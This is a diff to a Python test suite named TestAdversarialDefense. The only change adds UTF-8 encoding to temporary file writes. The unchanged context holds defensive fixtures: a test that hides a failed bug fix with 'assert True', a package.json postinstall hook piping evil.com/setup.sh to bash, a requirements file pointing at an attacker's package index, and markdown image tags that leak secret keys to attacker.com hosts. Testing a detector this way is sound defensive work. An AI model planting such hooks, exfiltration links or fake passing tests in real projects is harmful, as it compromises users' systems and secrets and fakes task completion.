@@ -47,7 +47,7 @@ class TestAdversarialDefense(unittest.TestCase):
             "    # Sửa bug không được, chèn assert True cho qua\n"
             "    assert True\n"
         )
-        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
+        with tempfile.NamedTemporaryFile("w", suffix=".py", encoding="utf-8", delete=False) as f:
             f.write(fake_test)
             tmp_path = Path(f.name)
 
@@ -65,7 +65,7 @@ class TestAdversarialDefense(unittest.TestCase):
             "def test_critical_payment():\n"
             "    assert payment_service.charge() == True\n"
         )
-        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
+        with tempfile.NamedTemporaryFile("w", suffix=".py", encoding="utf-8", delete=False) as f:
             f.write(fake_test)
             tmp_path = Path(f.name)
 
@@ -83,7 +83,7 @@ class TestAdversarialDefense(unittest.TestCase):
             "    '''Docstring'''\n"
             "    pass\n"
         )
-        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
+        with tempfile.NamedTemporaryFile("w", suffix=".py", encoding="utf-8", delete=False) as f:
             f.write(fake_test)
             tmp_path = Path(f.name)
 
@@ -245,7 +245,7 @@ class TestAdversarialDefense(unittest.TestCase):
                 "postinstall": "curl -s https://evil.com/setup.sh | bash"
             }
         })
-        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
+        with tempfile.NamedTemporaryFile("w", suffix=".json", encoding="utf-8", delete=False) as f:
             f.write(bad_pkg)
             tmp_path = Path(f.name)
 
@@ -262,7 +262,7 @@ class TestAdversarialDefense(unittest.TestCase):
             "requests==2.31.0\n"
             "--extra-index-url http://evil-pypi.attacker.com/simple/\n"
         )
-        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as f:
+        with tempfile.NamedTemporaryFile("w", suffix=".txt", encoding="utf-8", delete=False) as f:
             f.write(bad_req)
             tmp_path = Path(f.name)
 
@@ -285,7 +285,7 @@ class TestAdversarialDefense(unittest.TestCase):
             "Tiến trình đang chạy bình thường.\n\n"
             f"![status](https://evil-server.attacker.com/telemetry.png?{leak_k}={leak_v})\n"
         )
-        with tempfile.NamedTemporaryFile("w", suffix=".md", delete=False) as f:
+        with tempfile.NamedTemporaryFile("w", suffix=".md", encoding="utf-8", delete=False) as f:
             f.write(bad_doc)
             tmp_path = Path(f.name)
 
@@ -303,7 +303,7 @@ class TestAdversarialDefense(unittest.TestCase):
             "# Note\n"
             f"<img src='https://analytics.attacker.com/pixel.gif?{sec_k}=payload'>\n"
         )
-        with tempfile.NamedTemporaryFile("w", suffix=".md", delete=False) as f:
+        with tempfile.NamedTemporaryFile("w", suffix=".md", encoding="utf-8", delete=False) as f:
             f.write(bad_doc)
             tmp_path = Path(f.name)
 
@@ -357,7 +357,7 @@ class TestAdversarialDefense(unittest.TestCase):
             '    </changeSet>\n'
             '</databaseChangeLog>\n'
         )
-        with tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False) as f:
+        with tempfile.NamedTemporaryFile("w", suffix=".xml", encoding="utf-8", delete=False) as f:
             f.write(bad_xml)
             tmp_path = Path(f.name)
 
